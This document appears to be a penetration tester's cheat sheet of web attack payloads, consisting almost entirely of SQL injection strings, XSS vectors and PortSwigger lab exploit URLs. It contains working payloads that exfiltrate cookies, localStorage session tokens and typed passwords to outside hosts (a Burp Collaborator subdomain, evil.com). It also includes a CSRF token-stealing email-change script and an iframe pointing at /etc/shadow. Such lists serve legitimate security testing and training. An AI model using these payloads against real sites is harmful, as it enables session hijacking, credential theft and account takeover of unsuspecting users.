validuser' OR '1'='1
' OR '1'='1
" onmouseover=alert(t) "

" onmouseover="alert(t) " "
<img src="x" onerror="alert(l);" >
" oncontextmenu="alert(t) " "
"");alert(j);//
"$ \unicode {41<img src=1 onerror=alert(document.domain)>} $"
<a href="javascript:alert(1)">CLICK</a>

<script>
  <!--
  (async function(){}).constructor('alert(1)')();
</script>​

'-alert('m')-'
alert` xss:( `
<img onerror=”{alert`1`}” src>
“accesskey=’X’ onclick=’alert(1)’”
"}; alert(1); //
<h1+onmouseover=confirm`1`+%0a>Lol</h1>

–> “/><svg x=”>” onload=”(co\u006efirm)(document.cookie)”></svg>
fisrtName={{constructor.constructor('alert(document.cookie)'
lastName = )()}}

“/><iframe src=”file:///etc/shadow”></iframe>



we can add payload in the xml injection payloads. make it like xml tags 

we can check the local storage for any sensitive info and for XSS

javascript:alert(2)

<script>window.location.assign("http://ev.il");</script>
<script>document.body.background="https://demo.testfire.net/images/pf_lock.gif";</script>

<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
<a href="javascript:alert(document.domain)">
</script><img src=1 onerror=alert(document.domain)>
'-alert(document.domain)-'
';alert(document.domain)//
';alert(document.domain)//
\';alert(document.domain)//
\';alert(document.domain)//
\\';alert(document.domain)//
'-alert(1)-'
'-alert(1)-'
${alert(1)}
[1].map(alert)
$eval('x=alert(1)'
?&apos;-alert(1)-&apos;
onerror=alert;throw 1
<a href="#" onclick="... var input='controllable data here'; ...">
&apos;-alert(document.domain)-&apos;
${alert(document.domain)}
%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'

<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
"onmouseover="alert(1)
javascript:alert(1)
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)    ----  hit On Windows: ALT+SHIFT+X

https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

<script>
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

<img onerror=”{alert`1`}” src>
”:”xss\”onclick=\”alert(1)”
 alert(localStorage.getItem('access_token'))
<img src=x onerror="document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')">

<img src=x onerror=eval(prompt())>
